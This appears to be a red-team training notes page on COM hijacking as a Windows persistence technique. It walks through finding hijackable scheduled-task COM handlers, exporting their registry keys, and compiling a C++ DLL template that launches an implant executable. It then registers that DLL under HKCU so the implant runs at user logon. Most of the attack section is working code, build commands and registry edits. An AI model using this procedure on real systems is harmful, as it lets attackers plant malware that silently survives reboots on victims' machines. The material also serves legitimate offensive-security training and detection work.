# COM Hijacking

## <mark style="color:red;">COM</mark>

> The Microsoft Component Object Model (COM) is an interface standard that allows the software components to interact and communicate with each other’s code without knowledge of their internal implementation.

#### In simple words, COM is a system that helps developers build libraries which can co-operate with other apps developed with other languages.

OM objects are identified by their globally unique identifiers (GUIDs) known as class identifiers (CLSIDs) and interface identifiers (IIDs) and they are registered in registry hives.&#x20;

The merged registry hive HKCR contains the combined information of HKCU and HKLM.

```
HKEY_CURRENT_USER\Software\Classes\<CLSID>  (Per-User)

HKEY_LOCAL_MACHINE\Software\Classes\<CLSID> (System-Wide)
```

{% hint style="info" %}
COM usually lives in a DLL, sometimes as a EXE.&#x20;

It can also live on a remote machine.
{% endhint %}

When COM is present as a DLL, the process of COM loading looks like this:

![](<../../../.gitbook/assets/image (34).png>)

When COM is a EXE file the process will look like this:

![](<../../../.gitbook/assets/image (29).png>)

and if the COM object is on a remote machine:

![](<../../../.gitbook/assets/image (22).png>)

## <mark style="color:red;">COM Hijacking</mark>

One way to hijack the COM is by modifying the registry key in `HKEY_CUTRRENT_USER.`

![](<../../../.gitbook/assets/image (47) (1).png>)

to find hijackable COM objects we can look in scheduled tasks:

```
schtasks /query /xml > c:\RTO\PERS\01.USER\tasks.xml
```

we are looking for 2 things, in the `<Exec>` section there should be something called `<ComHandler>` instead of a binary path and in the  `<Triggers>` section we want a `<LogonTrigger>`.&#x20;

look for `<ComHandler>` in the output file, this will point to a specific class ID.&#x20;

after finding a suitable handler:

![](<../../../.gitbook/assets/image (20).png>)

{% hint style="warning" %}
#### note that the delay here is 5 minutes.
{% endhint %}

query this ID in registry:

```
reg query "HKCR\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}"

# to see if the key is in current user:
reg query "HKCU\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}"

# to see if the key is in local machine:
reg query "HKLM\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}"
```

![](<../../../.gitbook/assets/image (48).png>)

#### so the key is in local machine hive, if we put something in current user we can hijack that COM object.

we can export the target registry key as 64 bit :&#x20;

```
reg export "HKLM\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}" c:\tsk-orig.reg /y /reg:64
```

the output is something like this:

```
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}]
@="Work Folder Logon Trigger Class"

[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\InprocServer32]
@="C:\\Windows\\System32\\WorkFoldersShell.dll"
```

then use this template for COM hijacking:

{% code title="wrkFolderShell.cpp" %}
```cpp
/*

 Red Team Operator course code template
 COM hijacking template
 
 author: reenz0h (twitter: @sektor7net)

*/
#include <Windows.h>
#include <combaseapi.h>


BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {
    STARTUPINFO info={sizeof(info)};
    PROCESS_INFORMATION processInfo;

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;    
	case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

HRESULT STDAPI DllGetClassObject(__in REFCLSID rclsid,
								__in REFIID riid,
								__deref_out LPVOID FAR* ppv) { 
	STARTUPINFO info={sizeof(info)};
    PROCESS_INFORMATION processInfo;
	
	CreateProcess(
				"c:\\RTO\\PERS\\implant\\implant.exe", 
				"", NULL, NULL, TRUE, 0, NULL, NULL, 
				&info, &processInfo);
	
	return S_OK;  
} 



/*

typedef HRESULT(WINAPI * tDllGetClassObject)(REFCLSID rclsid, REFIID riid, LPVOID* ppv);
tDllGetClassObject pDllGetClassObject;

HRESULT STDAPI DllGetClassObject(REFCLSID rclsid,
								 REFIID riid,
								 LPVOID FAR* ppv) { 
	STARTUPINFO info={sizeof(info)};
    PROCESS_INFORMATION processInfo;
	HMODULE hOrigDLL;
	
	CreateProcess(
				"c:\\RTO\\PERS\\implant\\implant.exe", 
				"", NULL, NULL, TRUE, 0, NULL, NULL, 
				&info, &processInfo);
	
	hOrigDLL = LoadLibrary("C:\\Windows\\System32\\WorkFoldersShell.dll");
	pDllGetClassObject = (tDllGetClassObject) GetProcAddress(hOrigDLL, "DllGetClassObject");
	if (!pDllGetClassObject)
		return S_FALSE;
	
	HRESULT hRes = pDllGetClassObject(rclsid, riid, ppv);
	
	return hRes;
} 
*/cpp
```
{% endcode %}

{% code title="wrkFolderShell.def" %}
```cpp
LIBRARY
EXPORTS
  DllGetClassObject PRIVATE
```
{% endcode %}

compile it with:

{% code title="compile.bat" %}
```batch
@ECHO OFF

cl.exe /W0 /D_USRDLL /D_WINDLL wrkFoldersShell.cpp wrkFoldersShell.def /MT /link /DLL /OUT:wrkFoldersShell.dll
```
{% endcode %}

```
compile.bat
```

![](<../../../.gitbook/assets/image (45).png>)

now the DLL is ready, we should implant it in the registry.

change the original key to `CURRENT_USER` and change the path to DLL:

```
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}]
@="Work Folder Logon Trigger Class"

[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\InprocServer32]
@="C:\\Users\rto\Desktop\\WorkFoldersShell.dll"
```

save the new registry then import it to the hive.

```
reg import c:\tsk.reg /reg:64
```

check out:

```
reg query "HKCU\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\InProcServer32" /reg:64
```

![](<../../../.gitbook/assets/image (49).png>)

now we have to wait for the user to relogin or reboot the machine.

## <mark style="color:red;">Resources</mark>

{% embed url="https://cyberstruggle.org/com-hijacking-for-persistence" %}

{% embed url="https://attackiq.com/2020/03/26/component-object-model-hijacking" %}

{% embed url="https://pentestlab.blog/2020/05/20/persistence-com-hijacking" %}
